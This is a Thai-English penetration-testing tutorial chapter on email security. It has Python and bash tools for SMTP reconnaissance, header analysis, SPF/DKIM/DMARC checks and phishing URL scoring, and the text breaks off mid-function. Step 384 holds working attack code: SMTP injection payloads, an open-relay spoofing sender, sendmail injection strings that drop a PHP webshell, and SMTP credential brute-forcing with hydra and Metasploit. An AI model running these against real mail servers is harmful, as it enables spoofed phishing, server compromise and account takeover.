# Part 39: Email Security Testing (Steps 381-390)

## ภาพรวม
การทดสอบความปลอดภัยของระบบอีเมลครอบคลุมตั้งแต่การตรวจสอบ SMTP reconnaissance, SPF/DKIM/DMARC, mail server exploitation, phishing infrastructure analysis ไปจนถึง Business Email Compromise (BEC) techniques

---

## Step 381: SMTP Reconnaissance และ Banner Grabbing

### SMTP Service Discovery
```python
import socket
import ssl
import smtplib
import dns.resolver
import subprocess
from typing import List, Dict, Optional
from dataclasses import dataclass

@dataclass
class SMTPInfo:
    host: str
    port: int
    banner: str
    capabilities: List[str]
    starttls: bool
    auth_methods: List[str]
    open_relay: bool

class SMTPRecon:
    """SMTP Reconnaissance and Banner Grabbing"""
    
    SMTP_PORTS = [25, 465, 587, 2525]
    
    def __init__(self, target: str):
        self.target = target
        self.results = []
    
    def get_mx_records(self, domain: str) -> List[str]:
        """ดึง MX records ของ domain"""
        mx_hosts = []
        try:
            answers = dns.resolver.resolve(domain, 'MX')
            for rdata in sorted(answers, key=lambda x: x.preference):
                mx_hosts.append(str(rdata.exchange).rstrip('.'))
                print(f"MX Record: {rdata.preference} {rdata.exchange}")
        except Exception as e:
            print(f"Error resolving MX: {e}")
        return mx_hosts
    
    def grab_banner(self, host: str, port: int, use_ssl: bool = False) -> Optional[str]:
        """ดึง SMTP banner"""
        try:
            if use_ssl:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                with socket.create_connection((host, port), timeout=10) as sock:
                    with context.wrap_socket(sock) as ssock:
                        banner = ssock.recv(1024).decode('utf-8', errors='ignore').strip()
                        return banner
            else:
                with socket.create_connection((host, port), timeout=10) as sock:
                    banner = sock.recv(1024).decode('utf-8', errors='ignore').strip()
                    return banner
        except Exception as e:
            return None
    
    def get_smtp_capabilities(self, host: str, port: int) -> Dict:
        """ตรวจสอบ SMTP capabilities"""
        info = {
            'banner': None,
            'capabilities': [],
            'starttls': False,
            'auth_methods': [],
            'server_software': None
        }
        
        try:
            use_ssl = port == 465
            smtp = smtplib.SMTP(timeout=10) if not use_ssl else smtplib.SMTP_SSL(timeout=10)
            smtp.connect(host, port)
            
            info['banner'] = smtp.getwelcome().decode('utf-8')
            print(f"Banner: {info['banner']}")
            
            # EHLO command
            code, resp = smtp.ehlo('test.example.com')
            if code == 250:
                caps = resp.decode('utf-8').split('\n')
                for cap in caps:
                    cap = cap.strip()
                    info['capabilities'].append(cap)
                    
                    if 'STARTTLS' in cap:
                        info['starttls'] = True
                    elif 'AUTH' in cap:
                        auth_methods = cap.replace('AUTH', '').strip().split()
                        info['auth_methods'] = auth_methods
            
            # Identify server software from banner
            banner = info['banner'].lower()
            if 'postfix' in banner:
                info['server_software'] = 'Postfix'
            elif 'sendmail' in banner:
                info['server_software'] = 'Sendmail'
            elif 'exchange' in banner or 'microsoft' in banner:
                info['server_software'] = 'Microsoft Exchange'
            elif 'exim' in banner:
                info['server_software'] = 'Exim'
            elif 'zimbra' in banner:
                info['server_software'] = 'Zimbra'
            
            smtp.quit()
        except Exception as e:
            print(f"Error: {e}")
        
        return info
    
    def check_open_relay(self, host: str, port: int) -> bool:
        """ตรวจสอบว่า mail server เป็น open relay หรือไม่"""
        try:
            smtp = smtplib.SMTP(host, port, timeout=10)
            smtp.ehlo('test.example.com')
            
            # พยายามส่งอีเมลจาก external ไปยัง external
            code, _ = smtp.mail('test@external-domain.com')
            if code == 250:
                code, _ = smtp.rcpt('target@another-external.com')
                if code == 250:
                    smtp.quit()
                    return True  # Open relay!
            
            smtp.quit()
        except smtplib.SMTPRecipientsRefused:
            pass  # ถูก reject = ไม่ใช่ open relay
        except Exception:
            pass
        
        return False
    
    def enumerate_users_vrfy(self, host: str, port: int, userlist: List[str]) -> List[str]:
        """Enumerate users ผ่าน VRFY command"""
        valid_users = []
        
        try:
            smtp = smtplib.SMTP(host, port, timeout=10)
            smtp.ehlo('test.example.com')
            
            for user in userlist:
                try:
                    code, resp = smtp.verify(user)
                    if code in [250, 251, 252]:
                        valid_users.append(user)
                        print(f"Valid: {user} - {resp}")
                    else:
                        print(f"Invalid: {user} - {code}")
                except Exception:
                    pass
            
            smtp.quit()
        except Exception as e:
            print(f"VRFY Error: {e}")
        
        return valid_users
    
    def enumerate_users_expn(self, host: str, port: int, lists: List[str]) -> Dict:
        """Enumerate members ผ่าน EXPN command"""
        results = {}
        
        try:
            with socket.create_connection((host, port), timeout=10) as sock:
                sock.recv(1024)  # banner
                sock.send(b'EHLO test.example.com\r\n')
                sock.recv(1024)
                
                for ml in lists:
                    sock.send(f'EXPN {ml}\r\n'.encode())
                    resp = sock.recv(4096).decode('utf-8', errors='ignore')
                    if resp.startswith('250'):
                        members = [line.split(' ', 1)[1] for line in resp.strip().split('\n') if line]
                        results[ml] = members
                        print(f"List {ml}: {members}")
                    else:
                        print(f"EXPN {ml}: {resp[:50]}")
                
                sock.send(b'QUIT\r\n')
        except Exception as e:
            print(f"EXPN Error: {e}")
        
        return results
    
    def scan_smtp_ports(self, host: str) -> List[SMTPInfo]:
        """Scan SMTP ports ทั้งหมด"""
        results = []
        
        for port in self.SMTP_PORTS:
            try:
                caps = self.get_smtp_capabilities(host, port)
                open_relay = self.check_open_relay(host, port)
                
                info = SMTPInfo(
                    host=host,
                    port=port,
                    banner=caps.get('banner', ''),
                    capabilities=caps.get('capabilities', []),
                    starttls=caps.get('starttls', False),
                    auth_methods=caps.get('auth_methods', []),
                    open_relay=open_relay
                )
                results.append(info)
                
                print(f"\nPort {port}:")
                print(f"  Banner: {info.banner[:50] if info.banner else 'N/A'}")
                print(f"  STARTTLS: {info.starttls}")
                print(f"  Auth Methods: {', '.join(info.auth_methods)}")
                print(f"  Open Relay: {'YES - VULNERABLE!' if info.open_relay else 'No'}")
                
            except Exception:
                pass
        
        return results


# smtp_recon_script.sh
SMTP_RECON_SCRIPT = '''
#!/bin/bash
# SMTP Reconnaissance Script

TARGET="$1"
[[ -z "$TARGET" ]] && echo "Usage: $0 <domain/ip>" && exit 1

echo "=== SMTP Reconnaissance ==="

# MX Lookup
echo "\n[*] MX Records:"
nslookup -type=MX "$TARGET" 2>/dev/null | grep "mail exchanger"
dig MX "$TARGET" +short 2>/dev/null

# Port scan
echo "\n[*] Scanning SMTP ports:"
for port in 25 465 587 2525; do
    nc -zv -w3 "$TARGET" $port 2>&1 | grep -E '(open|connected)' && echo "  Port $port: OPEN"
done

# Banner grab
echo "\n[*] Banner Grab (port 25):"
echo "EHLO test" | nc -w5 "$TARGET" 25 2>/dev/null | head -20

# Check VRFY
echo "\n[*] Testing VRFY command:"
echo -e "EHLO test\nVRFY root\nVRFY admin\nQUIT" | nc -w5 "$TARGET" 25 2>/dev/null

# Check EXPN
echo "\n[*] Testing EXPN command:"
echo -e "EHLO test\nEXPN root\nEXPN admin\nQUIT" | nc -w5 "$TARGET" 25 2>/dev/null

# smtp-user-enum
echo "\n[*] User enumeration with smtp-user-enum:"
if command -v smtp-user-enum &>/dev/null; then
    smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t "$TARGET"
fi

# nmap smtp scripts
echo "\n[*] Nmap SMTP scripts:"
nmap -p25,465,587 --script smtp-commands,smtp-open-relay,smtp-enum-users "$TARGET"
'''
```

---

## Step 382: Email Header Analysis

```python
import email
import re
from email import policy
from email.parser import BytesParser, Parser
from typing import List, Dict, Optional, Tuple
import ipaddress
from datetime import datetime

class EmailHeaderAnalyzer:
    """วิเคราะห์ email headers เพื่อตรวจหา spoofing และ phishing"""
    
    def __init__(self):
        self.suspicious_indicators = []
    
    def parse_email(self, raw_email: str) -> email.message.Message:
        """Parse raw email message"""
        return Parser(policy=policy.default).parsestr(raw_email)
    
    def extract_received_headers(self, msg: email.message.Message) -> List[Dict]:
        """Extract และ parse Received headers"""
        received_headers = msg.get_all('Received', [])
        parsed = []
        
        for i, header in enumerate(received_headers):
            info = {
                'hop': i + 1,
                'raw': header,
                'from_ip': None,
                'from_host': None,
                'by_host': None,
                'timestamp': None,
                'protocol': None
            }
            
            # Extract IP address
            ip_match = re.search(r'\[(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\]', header)
            if ip_match:
                info['from_ip'] = ip_match.group(1)
            
            # Extract hostnames
            from_match = re.search(r'from\s+(\S+)', header, re.IGNORECASE)
            if from_match:
                info['from_host'] = from_match.group(1)
            
            by_match = re.search(r'by\s+(\S+)', header, re.IGNORECASE)
            if by_match:
                info['by_host'] = by_match.group(1)
            
            # Extract timestamp
            time_match = re.search(r'(\w+,\s+\d+\s+\w+\s+\d{4}\s+\d{2}:\d{2}:\d{2})', header)
            if time_match:
                try:
                    info['timestamp'] = datetime.strptime(
                        time_match.group(1), '%a, %d %b %Y %H:%M:%S'
                    )
                except ValueError:
                    info['timestamp'] = time_match.group(1)
            
            # Detect protocol
            if 'ESMTP' in header:
                info['protocol'] = 'ESMTP'
            elif 'SMTP' in header:
                info['protocol'] = 'SMTP'
            elif 'HTTPS' in header:
                info['protocol'] = 'HTTPS'
            
            parsed.append(info)
        
        return parsed
    
    def check_spoofing_indicators(self, msg: email.message.Message) -> List[str]:
        """ตรวจหา email spoofing indicators"""
        indicators = []
        
        # Check From vs Reply-To mismatch
        from_addr = msg.get('From', '')
        reply_to = msg.get('Reply-To', '')
        
        if reply_to and from_addr:
            from_domain = re.search(r'@([\w.-]+)', from_addr)
            reply_domain = re.search(r'@([\w.-]+)', reply_to)
            
            if from_domain and reply_domain:
                if from_domain.group(1).lower() != reply_domain.group(1).lower():
                    indicators.append(
                        f"From domain ({from_domain.group(1)}) != Reply-To domain ({reply_domain.group(1)})"
                    )
        
        # Check Return-Path vs From mismatch
        return_path = msg.get('Return-Path', '')
        if return_path and from_addr:
            rp_domain = re.search(r'@([\w.-]+)', return_path)
            from_domain = re.search(r'@([\w.-]+)', from_addr)
            
            if rp_domain and from_domain:
                if rp_domain.group(1).lower() != from_domain.group(1).lower():
                    indicators.append(
                        f"Return-Path domain ({rp_domain.group(1)}) != From domain ({from_domain.group(1)})"
                    )
        
        # Check for suspicious X-Originating-IP
        x_orig_ip = msg.get('X-Originating-IP', '')
        if x_orig_ip:
            ip = x_orig_ip.strip('[]')
            try:
                addr = ipaddress.ip_address(ip)
                if addr.is_private:
                    indicators.append(f"X-Originating-IP is private: {ip}")
                else:
                    indicators.append(f"X-Originating-IP: {ip} (check reputation)")
            except ValueError:
                pass
        
        # Check for display name spoofing
        display_match = re.search(r'"?([^"<]+)"?\s*<([^>]+)>', from_addr)
        if display_match:
            display_name = display_match.group(1).strip()
            email_addr = display_match.group(2).strip()
            
            # Common brands in display name
            brands = ['paypal', 'amazon', 'microsoft', 'apple', 'google', 'bank', 'fedex', 'ups']
            for brand in brands:
                if brand.lower() in display_name.lower():
                    if brand.lower() not in email_addr.lower():
                        indicators.append(
                            f"Display name spoofing: '{display_name}' from <{email_addr}>"
                        )
        
        # Check for Unicode homograph attacks
        if any(ord(c) > 127 for c in from_addr):
            indicators.append(f"Non-ASCII characters in From address: {from_addr}")
        
        return indicators
    
    def analyze_authentication_results(self, msg: email.message.Message) -> Dict:
        """วิเคราะห์ Authentication-Results header"""
        auth_results = msg.get('Authentication-Results', '')
        results = {
            'spf': 'none',
            'dkim': 'none',
            'dmarc': 'none',
            'raw': auth_results
        }
        
        if auth_results:
            # SPF result
            spf_match = re.search(r'spf=(\w+)', auth_results, re.IGNORECASE)
            if spf_match:
                results['spf'] = spf_match.group(1).lower()
            
            # DKIM result
            dkim_match = re.search(r'dkim=(\w+)', auth_results, re.IGNORECASE)
            if dkim_match:
                results['dkim'] = dkim_match.group(1).lower()
            
            # DMARC result
            dmarc_match = re.search(r'dmarc=(\w+)', auth_results, re.IGNORECASE)
            if dmarc_match:
                results['dmarc'] = dmarc_match.group(1).lower()
        
        return results
    
    def generate_report(self, raw_email: str) -> Dict:
        """สร้าง comprehensive email analysis report"""
        msg = self.parse_email(raw_email)
        
        report = {
            'headers': {
                'from': msg.get('From'),
                'to': msg.get('To'),
                'cc': msg.get('Cc'),
                'subject': msg.get('Subject'),
                'date': msg.get('Date'),
                'message_id': msg.get('Message-ID'),
                'reply_to': msg.get('Reply-To'),
                'return_path': msg.get('Return-Path'),
            },
            'routing': self.extract_received_headers(msg),
            'authentication': self.analyze_authentication_results(msg),
            'spoofing_indicators': self.check_spoofing_indicators(msg),
            'risk_score': 0
        }
        
        # Calculate risk score
        score = 0
        auth = report['authentication']
        
        if auth['spf'] in ['fail', 'softfail']:
            score += 30
        if auth['dkim'] == 'fail':
            score += 30
        if auth['dmarc'] == 'fail':
            score += 40
        
        score += len(report['spoofing_indicators']) * 10
        report['risk_score'] = min(score, 100)
        
        return report
```

---

## Step 383: SPF, DKIM, DMARC Testing

```python
import dns.resolver
import dns.exception
import re
from typing import Dict, List, Optional, Tuple

class EmailAuthTester:
    """ทดสอบ SPF, DKIM, DMARC configuration"""
    
    def check_spf(self, domain: str) -> Dict:
        """ตรวจสอบ SPF record"""
        result = {
            'domain': domain,
            'record': None,
            'valid': False,
            'mechanisms': [],
            'policy': None,
            'issues': [],
            'includes': []
        }
        
        try:
            # ค้นหา SPF record ใน TXT records
            answers = dns.resolver.resolve(domain, 'TXT')
            for rdata in answers:
                txt = rdata.to_text().strip('"')
                if txt.startswith('v=spf1'):
                    result['record'] = txt
                    result['valid'] = True
                    break
            
            if not result['record']:
                result['issues'].append('No SPF record found')
                return result
            
            # Parse SPF mechanisms
            parts = result['record'].split()
            for part in parts[1:]:  # Skip v=spf1
                if part.startswith('include:'):
                    result['includes'].append(part[8:])
                    result['mechanisms'].append({'type': 'include', 'value': part[8:]})
                elif part.startswith('ip4:'):
                    result['mechanisms'].append({'type': 'ip4', 'value': part[4:]})
                elif part.startswith('ip6:'):
                    result['mechanisms'].append({'type': 'ip6', 'value': part[4:]})
                elif part.startswith('a:') or part == 'a':
                    result['mechanisms'].append({'type': 'a', 'value': part[2:] or domain})
                elif part.startswith('mx:') or part == 'mx':
                    result['mechanisms'].append({'type': 'mx', 'value': part[3:] or domain})
                elif part in ['+all', '-all', '~all', '?all']:
                    result['policy'] = part
                    
                    if part == '+all':
                        result['issues'].append('CRITICAL: +all allows ANY server to send mail!')
                    elif part == '?all':
                        result['issues'].append('Neutral policy (?all) provides minimal protection')
                    elif part == '~all':
                        result['issues'].append('Soft fail (~all) - consider upgrading to -all')
            
            # Check DNS lookup limit (max 10)
            lookup_count = len([m for m in result['mechanisms'] 
                               if m['type'] in ['include', 'a', 'mx', 'redirect']])
            if lookup_count > 10:
                result['issues'].append(f'Exceeds 10 DNS lookup limit ({lookup_count} lookups)')
            
        except dns.exception.NXDOMAIN:
            result['issues'].append('Domain does not exist')
        except dns.resolver.NoAnswer:
            result['issues'].append('No TXT records found')
        except Exception as e:
            result['issues'].append(f'Error: {str(e)}')
        
        return result
    
    def check_dkim(self, domain: str, selectors: List[str] = None) -> Dict:
        """ค้นหาและตรวจสอบ DKIM records"""
        if selectors is None:
            selectors = ['default', 'google', 'k1', 's1', 's2', 'mail', 
                        'email', 'selector1', 'selector2', 'dkim', 'key1']
        
        results = {}
        
        for selector in selectors:
            dkim_domain = f'{selector}._domainkey.{domain}'
            try:
                answers = dns.resolver.resolve(dkim_domain, 'TXT')
                for rdata in answers:
                    txt = rdata.to_text().strip('"')
                    if 'v=DKIM1' in txt or 'p=' in txt:
                        info = self._parse_dkim_record(txt)
                        info['selector'] = selector
                        info['domain'] = dkim_domain
                        results[selector] = info
                        print(f"Found DKIM: {dkim_domain}")
                        break
            except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer):
                pass
            except Exception as e:
                pass
        
        return results
    
    def _parse_dkim_record(self, record: str) -> Dict:
        """Parse DKIM TXT record"""
        info = {
            'version': None,
            'key_type': 'rsa',
            'public_key': None,
            'flags': [],
            'hash_algorithms': [],
            'service_type': [],
            'issues': []
        }
        
        parts = dict(p.strip().split('=', 1) for p in record.split(';') if '=' in p)
        
        info['version'] = parts.get('v')
        info['key_type'] = parts.get('k', 'rsa')
        info['public_key'] = parts.get('p', '')
        
        if 't' in parts:
            flags = parts['t'].split(':')
            info['flags'] = flags
            if 'y' in flags:
                info['issues'].append('Test mode enabled (t=y) - not enforced')
        
        if 'h' in parts:
            info['hash_algorithms'] = parts['h'].split(':')
        
        if 's' in parts:
            info['service_type'] = parts['s'].split(':')
        
        # Check key strength
        if info['public_key']:
            import base64
            try:
                key_bytes = base64.b64decode(info['public_key'])
                # Rough estimate: RSA key length in bits
                key_bits = len(key_bytes) * 8 // 10 * 8  # approximation
                if key_bits < 1024:
                    info['issues'].append(f'Weak key (estimated {key_bits} bits)')
                elif key_bits < 2048:
                    info['issues'].append('Consider upgrading to 2048-bit key')
            except Exception:
                pass
        else:
            info['issues'].append('Empty public key - DKIM disabled for this selector!')
        
        return info
    
    def check_dmarc(self, domain: str) -> Dict:
        """ตรวจสอบ DMARC policy"""
        result = {
            'domain': domain,
            'record': None,
            'valid': False,
            'policy': None,
            'subdomain_policy': None,
            'pct': 100,
            'rua': [],
            'ruf': [],
            'alignment_spf': 'relaxed',
            'alignment_dkim': 'relaxed',
            'issues': [],
            'recommendations': []
        }
        
        dmarc_domain = f'_dmarc.{domain}'
        
        try:
            answers = dns.resolver.resolve(dmarc_domain, 'TXT')
            for rdata in answers:
                txt = rdata.to_text().strip('"')
                if txt.startswith('v=DMARC1'):
                    result['record'] = txt
                    result['valid'] = True
                    break
            
            if not result['record']:
                result['issues'].append('No DMARC record found - domain unprotected!')
                return result
            
            # Parse DMARC tags
            tags = dict(t.strip().split('=', 1) for t in result['record'].split(';') if '=' in t)
            
            result['policy'] = tags.get('p', 'none')
            result['subdomain_policy'] = tags.get('sp', result['policy'])
            result['pct'] = int(tags.get('pct', '100'))
            
            if 'rua' in tags:
                result['rua'] = [r.strip() for r in tags['rua'].split(',')]
            if 'ruf' in tags:
                result['ruf'] = [r.strip() for r in tags['ruf'].split(',')]
            
            result['alignment_spf'] = tags.get('aspf', 'r')
            result['alignment_dkim'] = tags.get('adkim', 'r')
            
            # Check issues
            if result['policy'] == 'none':
                result['issues'].append('Policy is none - no protection against spoofing!')
                result['recommendations'].append('Upgrade to p=quarantine or p=reject')
            elif result['policy'] == 'quarantine':
                result['recommendations'].append('Consider upgrading to p=reject for maximum protection')
            
            if result['pct'] < 100:
                result['issues'].append(f'Policy only applies to {result["pct"]}% of emails')
            
            if not result['rua']:
                result['recommendations'].append('Add rua= for aggregate reporting')
            
        except dns.resolver.NXDOMAIN:
            result['issues'].append(f'No DMARC record at {dmarc_domain}')
        except Exception as e:
            result['issues'].append(f'Error: {str(e)}')
        
        return result
    
    def comprehensive_check(self, domain: str) -> Dict:
        """ตรวจสอบ email authentication ครบทุกระบบ"""
        print(f"\nEmail Authentication Check for: {domain}")
        print("=" * 50)
        
        spf = self.check_spf(domain)
        print(f"\nSPF: {'PASS' if spf['valid'] else 'FAIL'}")
        print(f"  Record: {spf['record']}")
        print(f"  Policy: {spf['policy']}")
        for issue in spf['issues']:
            print(f"  [!] {issue}")
        
        dkim = self.check_dkim(domain)
        print(f"\nDKIM: {'Found ' + str(len(dkim)) + ' selector(s)' if dkim else 'NOT FOUND'}")
        for selector, info in dkim.items():
            print(f"  Selector: {selector}")
            for issue in info.get('issues', []):
                print(f"  [!] {issue}")
        
        dmarc = self.check_dmarc(domain)
        print(f"\nDMARC: {'PASS' if dmarc['valid'] else 'FAIL'}")
        print(f"  Policy: {dmarc['policy']}")
        print(f"  Subdomain Policy: {dmarc['subdomain_policy']}")
        for issue in dmarc['issues']:
            print(f"  [!] {issue}")
        for rec in dmarc['recommendations']:
            print(f"  [*] {rec}")
        
        return {'spf': spf, 'dkim': dkim, 'dmarc': dmarc}
```

---

## Step 384: Mail Server Exploitation

```python
import smtplib
import socket
import ssl
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from typing import List, Dict, Optional
import base64
import struct

class MailServerExploit:
    """Mail server exploitation techniques"""

    def test_smtp_injection(self, host: str, port: int = 25) -> List[str]:
        """ทดสอบ SMTP header injection"""
        vulnerabilities = []
        
        # SMTP injection payloads
        payloads = [
            # Header injection via subject
            {'field': 'subject', 'payload': 'Test\r\nBCC: attacker@evil.com'},
            # CRLF injection
            {'field': 'from', 'payload': 'sender@test.com\r\nRCPT TO: victim@target.com'},
            # Null byte injection
            {'field': 'to', 'payload': 'user@target.com\x00@evil.com'},
            # Command injection in MAIL FROM
            {'field': 'mail_from', 'payload': '"test\"\r\nDATA\r\nX-Injected: yes\r\n.\r\nMAIL FROM: "@evil.com'},
        ]
        
        for test in payloads:
            try:
                with socket.create_connection((host, port), timeout=10) as sock:
                    sock.recv(1024)  # banner
                    sock.send(b'EHLO test.com\r\n')
                    sock.recv(1024)
                    
                    if test['field'] == 'mail_from':
                        sock.send(f'MAIL FROM: <{test["payload"]}>\r\n'.encode())
                        resp = sock.recv(1024).decode('utf-8', errors='ignore')
                        if '250' in resp:
                            vulnerabilities.append(f"Possible SMTP injection in MAIL FROM")
                    
                    sock.send(b'QUIT\r\n')
            except Exception:
                pass
        
        return vulnerabilities
    
    def exploit_open_relay(self, host: str, port: int, 
                           from_addr: str, to_addr: str, 
                           subject: str, body: str) -> bool:
        """Exploit open relay to send spoofed email"""
        try:
            smtp = smtplib.SMTP(host, port, timeout=10)
            smtp.ehlo('legitimate-looking-server.com')
            
            msg = MIMEMultipart()
            msg['From'] = from_addr
            msg['To'] = to_addr
            msg['Subject'] = subject
            msg.attach(MIMEText(body, 'html'))
            
            smtp.sendmail(from_addr, [to_addr], msg.as_string())
            smtp.quit()
            print(f"Email sent via open relay: {from_addr} -> {to_addr}")
            return True
        except Exception as e:
            print(f"Open relay failed: {e}")
            return False
    
    def test_smtp_authentication_bypass(self, host: str, port: int) -> List[str]:
        """ทดสอบ SMTP authentication bypass"""
        bypasses = []
        
        # Test AUTH PLAIN with malformed data
        try:
            with socket.create_connection((host, port), timeout=10) as sock:
                sock.recv(1024)
                sock.send(b'EHLO test.com\r\n')
                resp = sock.recv(4096).decode('utf-8', errors='ignore')
                
                if 'AUTH PLAIN' in resp.upper():
                    # Empty credentials
                    sock.send(b'AUTH PLAIN \r\n')
                    resp = sock.recv(1024).decode('utf-8', errors='ignore')
                    if '235' in resp:
                        bypasses.append('AUTH PLAIN accepts empty credentials!')
                    
                    # Null byte trick
                    creds = base64.b64encode(b'\x00admin\x00').decode()
                    sock.send(f'AUTH PLAIN {creds}\r\n'.encode())
                    resp = sock.recv(1024).decode('utf-8', errors='ignore')
                    if '235' in resp:
                        bypasses.append('AUTH PLAIN null byte bypass!')
                
                sock.send(b'QUIT\r\n')
        except Exception:
            pass
        
        return bypasses
    
    def test_sendmail_command_injection(self, vulnerable_app_url: str) -> bool:
        """ทดสอบ sendmail command injection ผ่าน web app"""
        # Classic sendmail -t injection via email 'From' field
        # ช่องโหว่ใน PHP mail() function: mail($to, $subject, $body, $from)
        
        # PHP code vulnerable to injection:
        # mail($to, $subject, $body, "From: $user_input");
        
        # Payload: attacker@evil.com"\n -OQueueDirectory=/tmp -X/var/www/html/shell.php
        # This passes extra arguments to sendmail!
        
        injection_payloads = [
            # Write PHP webshell via sendmail -X flag
            'attacker@evil.com"\n -OQueueDirectory=/tmp\n -X/var/www/html/shell.php\n',
            # Bounce to additional recipients
            'attacker@evil.com -oG /tmp/x',
            # Exfiltrate via sendmail logging
            'test@test.com" -X /tmp/mail_log',
        ]
        
        print("[INFO] PHP mail() sendmail injection payloads:")
        for p in injection_payloads:
            print(f"  {p[:60]}...")
        
        # swaks command for testing
        swaks_cmd = f'''
swaks --to target@example.com \\
      --from "attacker@evil.com" \\
      --header "Subject: Test" \\
      --body "Test message" \\
      --server {vulnerable_app_url}
'''
        print(f"\nswaks command:\n{swaks_cmd}")
        return True
    
    def crack_smtp_credentials(self, host: str, port: int, 
                                user: str, wordlist: List[str]) -> Optional[str]:
        """Brute force SMTP credentials"""
        print(f"Testing {len(wordlist)} passwords for {user}@{host}:{port}")
        
        for password in wordlist:
            try:
                smtp = smtplib.SMTP(host, port, timeout=5)
                smtp.ehlo('test.com')
                
                if smtp.has_extn('STARTTLS'):
                    smtp.starttls()
                    smtp.ehlo('test.com')
                
                smtp.login(user, password)
                smtp.quit()
                print(f"SUCCESS: {user}:{password}")
                return password
                
            except smtplib.SMTPAuthenticationError:
                pass
            except smtplib.SMTPException as e:
                if 'too many' in str(e).lower():
                    print("Rate limited!")
                    break
            except Exception:
                break
        
        return None


# mail_server_attacks.sh
MAIL_ATTACK_SCRIPT = '''
#!/bin/bash
# Mail Server Attack Script

TARGET="$1"
DOMAIN="$2"

# Test with swaks
echo "[*] Testing with swaks:"
swaks --to user@$DOMAIN --from attacker@evil.com --server $TARGET

# SMTP user enumeration
echo "[*] SMTP user enumeration:"
smtp-user-enum -M RCPT -U /usr/share/wordlists/metasploit/unix_users.txt \\
               -D $DOMAIN -t $TARGET

# Brute force SMTP
echo "[*] SMTP brute force:"
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt smtp://$TARGET -s 587

# Metasploit SMTP modules
echo "[*] Metasploit modules:"
msfconsole -q -x "
use auxiliary/scanner/smtp/smtp_enum
set RHOSTS $TARGET
set USER_FILE /tmp/users.txt
run
"
'''
```

---

## Step 385: Phishing Infrastructure Analysis

```python
import re
import urllib.parse
import hashlib
import json
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass
import ipaddress

@dataclass
class PhishingIndicator:
    indicator_type: str
    value: str
    confidence: float
    description: str

class PhishingAnalyzer:
    """วิเคราะห์ phishing emails และ infrastructure"""
    
    SUSPICIOUS_DOMAINS = [
        'bit.ly', 'tinyurl.com', 'goo.gl', 'ow.ly', 'short.link',
        'rebrand.ly', 't.co', 'is.gd', 'buff.ly'
    ]
    
    PHISHING_KEYWORDS = [
        'urgent', 'immediate', 'action required', 'verify now',
        'account suspended', 'password expired', 'click here',
        'confirm your', 'update your', 'login to', 'sign in to',
        'limited time', 'expires soon', 'act now', 'important notice'
    ]
    
    HOMOGRAPH_CHARS = {
        'a': ['а', 'ａ'],  # Cyrillic, fullwidth
        'e': ['е', 'ｅ'],  # Cyrillic, fullwidth
        'o': ['о', 'ο', 'ｏ'],  # Cyrillic, Greek, fullwidth
        'c': ['с', 'ｃ'],  # Cyrillic, fullwidth
        'p': ['р', 'ｐ'],  # Cyrillic, fullwidth
        'x': ['х', 'ｘ'],  # Cyrillic, fullwidth
    }
    
    def analyze_url(self, url: str) -> Dict:
        """วิเคราะห์ URL ว่าเป็น phishing หรือไม่"""
        indicators = []
        risk_score = 0
        
        parsed = urllib.parse.urlparse(url)
        domain = parsed.netloc.lower()
        
        # Check for URL shortener
        for shortener in self.SUSPICIOUS_DOMAINS:
            if shortener in domain:
                indicators.append({'type': 'url_shortener', 'value': domain, 
                                  'description': 'URL shortener hides real destination'})
                risk_score += 20
        
        # Check for IP address instead of domain
        try:
            ipaddress.ip_address(domain.split(':')[0])
            indicators.append({'type': 'ip_url', 'value': domain,
                              'description': 'IP address used instead of domain'})
            risk_score += 35
        except ValueError:
            pass
        
        # Check for excessive subdomains
        parts = domain.split('.')
        if len(parts) > 4:
            indicators.append({'type': 'excessive_subdomains', 'value': domain,
                              'description': f'{len(parts)} domain levels (suspicious)'})
            risk_score += 15
        
        # Check for legitimate brand in subdomain
        brands = ['paypal', 'amazon', 'microsoft', 'apple', 'google', 
                 'facebook', 'twitter', 'linkedin', 'netflix']
        tld_domain = '.'.join(parts[-2:])
        for brand in brands:
            if brand in domain and brand not in tld_domain:
                indicators.append({'type': 'brand_impersonation', 'value': domain,
                                  'description': f'{brand} brand in subdomain of different TLD'})
                risk_score += 40
        
        # Check for homograph attack
        for char, lookalikes in self.HOMOGRAPH_CHARS.items():
            for lookalike in lookalikes:
                if lookalike in domain:
                    indicators.append({'type': 'homograph', 'value': domain,
                                      'description': f'Lookalike character for "{char}"'})
                    risk_score += 50
        
        # Check for typosquatting patterns
        typo_patterns = [
            (r'paypa[l1]', 'PayPal typosquat'),
            (r'amaz0n', 'Amazon typosquat'),
            (r'micros0ft', 'Microsoft typosquat'),
            (r'g[o0]{2}gle', 'Google typosquat'),
            (r'app1e', 'Apple typosquat'),
        ]
        for pattern, desc in typo_patterns:
            if re.search(pattern, domain, re.IGNORECASE):
                indicators.append({'type': 'typosquat', 'value': domain, 'description': desc})
                risk_score += 45
        
        # Suspicious TLDs
        suspicious_tlds = ['.xyz', '.top', '.work', '.click', '.link', 
                          '.online', '.site', '.website', '.tech']
        for tld in suspicious_tlds:
            if domain.endswith(tld):
                indicators.append({'type': 'suspicious_tld', 'value': tld,
                                  'description': 'Commonly used in phishing campaigns'})
                risk_score += 10
        
        # Check path for phishing patterns
        path = parsed.path.lower()
        phish_paths = ['/login', '/signin', '/verify', '/account/verify',
                      '/security', '/update', '/confirm', '/auth']
        for pp in phish_paths:
            if path.startswith(pp):
                indicators.append({'type': 'phish_path', 'value': path,
                                  'description': 'Common phishing page path'})
                risk_score += 10
        
        return {
            'url': url,
            'domain': domain,
            'risk_score': min(risk_score, 100),
            'indicators': indicators,
            'verdict': 'HIGH RISK' if risk_score >= 50 else 'MEDIUM' if risk_score >= 25 else 'LOW'
        }
    
    def analyze_email_body(self, body: str) -> Dict:
        """วิเคราะห์ email body หา phishing content"""
        results = {
            'urgency_words': [],
            'suspicious_links': [],
            'credential_requests': [],
            'attachments_referenced': [],
            'forms_detected': False,
            'risk_score': 0
        }
        
        body_lower = body.lower()
        
        # Check urgency language
        for keyword in self.PHISHING_KEYWORDS:
            if keyword in body_lower:
                results['urgency_words'].append(keyword)
                results['risk_score'] += 5
        
        # Extract and analyze URLs
